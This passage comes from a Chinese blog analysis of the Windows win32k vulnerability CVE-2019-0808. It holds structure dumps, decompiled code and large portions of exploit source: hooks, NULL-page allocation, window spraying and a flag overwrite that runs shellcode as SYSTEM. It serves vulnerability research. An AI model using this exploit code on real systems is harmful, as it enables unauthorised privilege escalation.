class="number">0x4C</span>, <span class="number">4</span>, &amp;secondAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不设置也可以，默认为0，也很小</span></span><br><span class="line"><span class="built_in">memset</span>((<span class="keyword">void</span>*)<span class="number">0x1A8</span>, <span class="number">0xff</span>, <span class="number">0x4</span>); <span class="comment">// 设置成为负数 (0x180+0x28)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换窗口句柄为触发漏洞的窗口</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] Replace the window handle to fakewindow\n"</span>);</span><br><span class="line"><span class="comment">// 拦截WM_MN_FINDMENUWINDOWFROMPOINT消息，将窗口的句柄替换为没有菜单的利用窗口</span></span><br><span class="line"><span class="keyword">return</span> (ULONG)hWndFakeWindow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, msg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="零页面内存分布"><a href="#零页面内存分布" class="headerlink" title="零页面内存分布"></a>零页面内存分布</h4><img src="/2019/10/10/CVE-2019-0808详细分析/50.png"><h4 id="MNGetpItem老版本"><a href="#MNGetpItem老版本" class="headerlink" title="MNGetpItem老版本"></a>MNGetpItem老版本</h4><blockquote><p>xxxMNSetGapState调用之前，会先调用MNGetpItem，</p></blockquote><p>这里要注意的是，在早期的win32k.sys中，MNGetpItem是直接实现逻辑的，而后来更新的版本，又将逻辑封装到了 MNGetpItemFromIndex 函数中。</p><img src="/2019/10/10/CVE-2019-0808详细分析/40.png"><p>MNGetpItem 老版本代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">MNGetpItem</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &amp;&amp; (v2 = *(_DWORD *)(a1 + <span class="number">0x14</span>), a2 &lt; *(_DWORD *)(v2 + <span class="number">0x20</span>)) )</span><br><span class="line">    result = *(_DWORD *)(v2 + <span class="number">0x34</span>) + <span class="number">0x6C</span> * a2;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析整理后的MNGetpItem代码（没有封装到MNGetpItemFromIndex函数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tagITEM *__<span class="function">stdcall <span class="title">MNGetpItem</span><span class="params">(tagPOPUPMENU *spPopupMenu, <span class="keyword">unsigned</span> <span class="keyword">int</span> pPopupMenu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tagMENU *spTagMenu; <span class="comment">// ecx 重点：漏洞触发时， spPopupMenu-&gt;spmenu 为NULL</span></span><br><span class="line">                      <span class="comment">//           pPopupMenu的值通过HOOK修改为0？</span></span><br><span class="line">  tagITEM *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( spPopupMenu &amp;&amp; (spTagMenu = spPopupMenu-&gt;spmenu, pPopupMenu &lt; spTagMenu-&gt;cItems) )</span><br><span class="line">    result = ((tagMENU*)&amp;spTagMenu[pPopupMenu])-&gt;rgItems;</span><br><span class="line">    <span class="comment">// result = *((DWORD*)spTagMenu + 0x34) + pPopupMenu * 0x6C;</span></span><br><span class="line">    <span class="comment">// spTagMenu-&gt;rgItems为 +0x34的偏移， [pPopupMenu] 为 +0x6C * pPopupMenu，而tagMENU结构体的大小正是0x6C。</span></span><br><span class="line">    <span class="comment">// 最终返回的是0x34内存中的值</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C语言默认情况下结构体是4字节对齐，可以算出tagMENU的大小为0x6C。相关结构体定义如下：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; dt tagMENU</span><br><span class="line">win32k!tagMENU</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">head             :</span> _PROCDESKHEAD</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">fFlags           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x018</span> <span class="string">iItem            :</span> Int4B</span><br><span class="line">   +<span class="number">0x01c</span> <span class="string">cAlloced         :</span> Uint4B</span><br><span class="line">   +<span class="number">0x020</span> <span class="string">cItems           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x024</span> <span class="string">cxMenu           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x028</span> <span class="string">cyMenu           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> <span class="string">cxTextAlign      :</span> Uint4B</span><br><span class="line">   +<span class="number">0x030</span> <span class="string">spwndNotify      :</span> Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x034</span> <span class="string">rgItems          :</span> Ptr32 tagITEM</span><br><span class="line">   +<span class="number">0x038</span> <span class="string">pParentMenus     :</span> Ptr32 tagMENULIST</span><br><span class="line">   +<span class="number">0x03c</span> <span class="string">dwContextHelpId  :</span> Uint4B</span><br><span class="line">   +<span class="number">0x040</span> <span class="string">cyMax            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x044</span> <span class="string">dwMenuData       :</span> Uint4B</span><br><span class="line">   +<span class="number">0x048</span> <span class="string">hbrBack          :</span> Ptr32 HBRUSH__</span><br><span class="line">   +<span class="number">0x04c</span> <span class="string">iTop             :</span> Int4B</span><br><span class="line">   +<span class="number">0x050</span> <span class="string">iMaxTop          :</span> Int4B</span><br><span class="line">   +<span class="number">0x054</span> <span class="string">dwArrowsOn       :</span> Pos <span class="number">0</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x058</span> <span class="string">umpm             :</span> tagUAHMENUPOPUPMETRICS</span><br><span class="line"></span><br><span class="line">lkd&gt; dt tagUAHMENUPOPUPMETRICS</span><br><span class="line">win32k!tagUAHMENUPOPUPMETRICS</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">rgcx             :</span> [<span class="number">4</span>] Int4B</span><br><span class="line">   +<span class="number">0x010</span> <span class="string">fUpdateMaxWidths :</span> Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line"></span><br><span class="line">lkd&gt; dt tagITEM</span><br><span class="line">win32k!tagITEM</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">fType            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fState           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x008</span> <span class="string">wID              :</span> Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> <span class="string">spSubMenu        :</span> Ptr32 tagMENU</span><br><span class="line">   +<span class="number">0x010</span> <span class="string">hbmpChecked      :</span> Ptr32 Void</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">hbmpUnchecked    :</span> Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> <span class="string">lpstr            :</span> Ptr32 Uint2B</span><br><span class="line">   +<span class="number">0x01c</span> <span class="string">cch              :</span> Uint4B</span><br><span class="line">   +<span class="number">0x020</span> <span class="string">dwItemData       :</span> Uint4B</span><br><span class="line">   +<span class="number">0x024</span> <span class="string">xItem            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x028</span> <span class="string">yItem            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> <span class="string">cxItem           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x030</span> <span class="string">cyItem           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x034</span> <span class="string">dxTab            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x038</span> <span class="string">ulX              :</span> Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> <span class="string">ulWidth          :</span> Uint4B</span><br><span class="line">   +<span class="number">0x040</span> <span class="string">hbmp             :</span> Ptr32 HBITMAP__</span><br><span class="line">   +<span class="number">0x044</span> <span class="string">cxBmp            :</span> Int4B</span><br><span class="line">   +<span class="number">0x048</span> <span class="string">cyBmp            :</span> Int4B</span><br><span class="line">   +<span class="number">0x04c</span> <span class="string">umim             :</span> tagUAHMENUITEMMETRICS</span><br><span class="line"></span><br><span class="line">lkd&gt; dt win32k!tagMENUSTATE</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">pGlobalPopupMenu :</span> Ptr32 tagPOPUPMENU</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fMenuStarted     :</span> Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fIsSysMenu       :</span> Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fInsideMenuLoop  :</span> Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fButtonDown      :</span> Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fInEndMenu       :</span> Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fUnderline       :</span> Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fButtonAlwaysDown :</span> Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fDragging        :</span> Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fModelessMenu    :</span> Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fInCallHandleMenuMessages :</span> Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fDragAndDrop     :</span> Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fAutoDismiss     :</span> Pos <span class="number">11</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fAboutToAutoDismiss :</span> Pos <span class="number">12</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fIgnoreButtonUp  :</span> Pos <span class="number">13</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fMouseOffMenu    :</span> Pos <span class="number">14</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fInDoDragDrop    :</span> Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fActiveNoForeground :</span> Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fNotifyByPos     :</span> Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fSetCapture      :</span> Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">iAniDropDir      :</span> Pos <span class="number">19</span>, <span class="number">5</span> Bits</span><br><span class="line">   +<span class="number">0x008</span> <span class="string">ptMouseLast      :</span> tagPOINT</span><br><span class="line">   +<span class="number">0x010</span> <span class="string">mnFocus          :</span> Int4B</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">cmdLast          :</span> Int4B</span><br><span class="line">   +<span class="number">0x018</span> <span class="string">ptiMenuStateOwner :</span> Ptr32 tagTHREADINFO</span><br><span class="line">   +<span class="number">0x01c</span> <span class="string">dwLockCount      :</span> Uint4B</span><br><span class="line">   +<span class="number">0x020</span> <span class="string">pmnsPrev         :</span> Ptr32 tagMENUSTATE</span><br><span class="line">   +<span class="number">0x024</span> <span class="string">ptButtonDown     :</span> tagPOINT</span><br><span class="line">   +<span class="number">0x02c</span> <span class="string">uButtonDownHitArea :</span> Uint4B</span><br><span class="line">   +<span class="number">0x030</span> <span class="string">uButtonDownIndex :</span> Uint4B</span><br><span class="line">   +<span class="number">0x034</span> <span class="string">vkButtonDown     :</span> Int4B</span><br><span class="line">   +<span class="number">0x038</span> <span class="string">uDraggingHitArea :</span> Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> <span class="string">uDraggingIndex   :</span> Uint4B</span><br><span class="line">   +<span class="number">0x040</span> <span class="string">uDraggingFlags   :</span> Uint4B</span><br><span class="line">   +<span class="number">0x044</span> <span class="string">hdcWndAni        :</span> Ptr32 HDC__</span><br><span class="line">   +<span class="number">0x048</span> <span class="string">dwAniStartTime   :</span> Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> <span class="string">ixAni            :</span> Int4B</span><br><span class="line">   +<span class="number">0x050</span> <span class="string">iyAni            :</span> Int4B</span><br><span class="line">   +<span class="number">0x054</span> <span class="string">cxAni            :</span> Int4B</span><br><span class="line">   +<span class="number">0x058</span> <span class="string">cyAni            :</span> Int4B</span><br><span class="line">   +<span class="number">0x05c</span> <span class="string">hbmAni           :</span> Ptr32 HBITMAP__</span><br><span class="line">   +<span class="number">0x060</span> <span class="string">hdcAni           :</span> Ptr32 HDC__</span><br><span class="line"></span><br><span class="line">typedef struct tagMENUWND &#123;</span><br><span class="line">    tagWND         wnd;         <span class="comment">// size = 0xaf</span></span><br><span class="line">    tagPOPUPMENU*  ppopupmenu; <span class="comment">// offset = 0xb0</span></span><br><span class="line">&#125; MENUWND, *PMENUWND;</span><br></pre></td></tr></table></figure><h4 id="修改标识"><a href="#修改标识" class="headerlink" title="修改标识"></a>修改标识</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowHookProc</span><span class="params">(INT code, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">tagCWPSTRUCT* cwp = (tagCWPSTRUCT*)lParam;</span><br><span class="line"><span class="comment">// 等待拖动鼠标事件</span></span><br><span class="line"><span class="keyword">if</span> (!bOnDraging) &#123;</span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改窗口消息处理函数为 SubMenuProc</span></span><br><span class="line"><span class="keyword">if</span> ((cwp-&gt;message == WM_MN_FINDMENUWINDOWFROMPOINT))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Update window[%p] proc to SubMenuProc \n"</span>, cwp-&gt;hwnd);</span><br><span class="line">SetWindowLongW(cwp-&gt;hwnd, GWLP_WNDPROC, (ULONG64)SubMenuProc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当xxxMNSetGapState调用后，内核将向窗口发送0x1E5消息（是个谜，没资料）</span></span><br><span class="line"><span class="comment">// 可以让内核去开始修改各种标识了</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ((cwp-&gt;message == <span class="number">0x1E5</span>)) &#123;</span><br><span class="line">UINT offset = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 计算第一个窗口的数据段起始位置</span></span><br><span class="line">UINT addressOfStartofPrimaryWndCbWndData = (primaryWindowAddress + <span class="number">0xB0</span>);</span><br><span class="line"><span class="comment">// 计算第二个窗口的 strName.Buffer 字段，到第一个窗口的数据段起始偏移</span></span><br><span class="line">offset = ((secondaryWindowAddress + <span class="number">0x8C</span>) - addressOfStartofPrimaryWndCbWndData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Offset: 0x%08X\r\n"</span>, offset);</span><br><span class="line"><span class="comment">// 修改 hSecondaryWindow 窗口的 strName.Buffer 指向其 bServerSideWindowProc标识 (secondaryWindowAddress + 0x16)</span></span><br><span class="line"><span class="keyword">if</span> (SetWindowLongA(hPrimaryWindow, offset, (secondaryWindowAddress + <span class="number">0x16</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] SetWindowLongA malicious error: 0x%08X\r\n"</span>, GetLastError());</span><br><span class="line">ExitProcess(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] SetWindowLongA called to set strName.Buffer : 0x%08X\r\n"</span>, (addressOfStartofPrimaryWndCbWndData + offset));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修改 hSecondaryWindow 窗口的 bServerSideWindowProc 标识所在字节为 \x06</span></span><br><span class="line"><span class="keyword">if</span> (SetWindowTextA(hSecondaryWindow, <span class="string">"\x06"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] SetWindowTextA couldn't set the bServerSideWindowProc bit. Error was: 0x%08X\r\n"</span>, GetLastError());</span><br><span class="line">ExitProcess(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Successfully set the bServerSideWindowProc bit at: 0x%08X\r\n"</span>, (secondaryWindowAddress + <span class="number">0x16</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Sending hSecondaryWindow a WM_ENTERIDLE message to trigger the execution of the shellcode as SYSTEM.\r\n"</span>);</span><br><span class="line">SendMessageA(hSecondaryWindow, WM_ENTERIDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (success == TRUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Successfully exploited CVE-2019-0808 and triggered the shellcode!\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Didn't exploit the program. For some reason our privileges were not appropriate.\r\n"</span>);</span><br><span class="line">ExitProcess(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD currentThreadId = GetCurrentThreadId();</span><br><span class="line">DWORD currentProcessId = GetCurrentProcessId();</span><br><span class="line">HINSTANCE hInst = GetModuleHandleA(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">pfnNtAllocateVirtualMemory = (NTAllocateVirtualMemory)GetProcAddress(GetModuleHandle(<span class="string">L"ntdll.dll"</span>), <span class="string">"NtAllocateVirtualMemory"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置窗口消息钩子</span></span><br><span class="line">SetWindowsHookExW(WH_CALLWNDPROC, (HOOKPROC)WindowHookProc, hInst, currentThreadId);</span><br><span class="line"><span class="comment">// 菜单弹出事件钩子，由 TrackPopupMenuEx 触发</span></span><br><span class="line">DWORD dwEventID = EVENT_SYSTEM_MENUPOPUPSTART;</span><br><span class="line">SetWinEventHook(dwEventID, dwEventID, hInst, DisplayEventProc, currentProcessId, currentThreadId, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配零地址内存</span></span><br><span class="line"><span class="keyword">if</span> (allocateNullPage() == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Couldn't allocate the NULL page!\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Allocated the NULL page!\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hUser32 = LoadLibraryW(<span class="string">L"user32.dll"</span>);</span><br><span class="line">HMODULE hGdi32 = LoadLibraryW(<span class="string">L"gdi32.dll"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到 HMValidateHandle 函数在 user32.dll 中的地址</span></span><br><span class="line"><span class="keyword">if</span> (findHMValidateHandleAddress(hUser32) == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Couldn't locate the address of HMValidateHandle!\r\n"</span>);</span><br><span class="line">ExitProcess(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 窗口喷射寻找内核写入地址</span></span><br><span class="line"><span class="keyword">if</span> (sprayWindows() == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Couldn't find two tagWND objects less than 0x3fd00 apart in memory after the spray!\r\n"</span>);</span><br><span class="line">ExitProcess(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发漏洞的窗口, 这个窗口的内部成员 tagPOPUPMENU 没有设置，多数成员为0</span></span><br><span class="line"><span class="comment">// hWndFakeWindow 菜单的 spMenu 为 NULL，触发漏洞</span></span><br><span class="line">hWndFakeWindow = CreateWindowA(<span class="string">"#32768"</span>, <span class="string">"MN"</span>, WS_DISABLED, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, hInst, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] FakeWindow: %p \n"</span>, hWndFakeWindow);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建2个拥有拖拽功能的菜单项</span></span><br><span class="line">HMENU hMenuRoot = CreatePopupMenu();</span><br><span class="line">HMENU hMenuSub = CreatePopupMenu();</span><br><span class="line">MENUINFO mi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">mi.cbSize = <span class="keyword">sizeof</span>(MENUINFO);</span><br><span class="line">mi.fMask = MIM_STYLE;</span><br><span class="line">mi.dwStyle = MNS_MODELESS | MNS_DRAGDROP;</span><br><span class="line">SetMenuInfo(hMenuRoot, &amp;mi);</span><br><span class="line">SetMenuInfo(hMenuSub, &amp;mi);</span><br><span class="line">AppendMenuA(hMenuRoot, MF_BYPOSITION | MF_POPUP, (UINT_PTR)hMenuSub, <span class="string">"Root"</span>);</span><br><span class="line">AppendMenuA(hMenuSub, MF_BYPOSITION | MF_POPUP, <span class="number">0</span>, <span class="string">"Sub"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册并创建窗口，绑定窗口菜单</span></span><br><span class="line"><span class="comment">// 窗口消息处理函数设置为系统默认的 DefWindowProc</span></span><br><span class="line"><span class="comment">// 为应用程序没有处理的任何窗口消息提供缺省的处理</span></span><br><span class="line">WNDCLASSEXA wndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">wndClass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEXA);</span><br><span class="line">wndClass.lpfnWndProc = DefWindowProc;</span><br><span class="line">wndClass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wndClass.cbWndExtra = <span 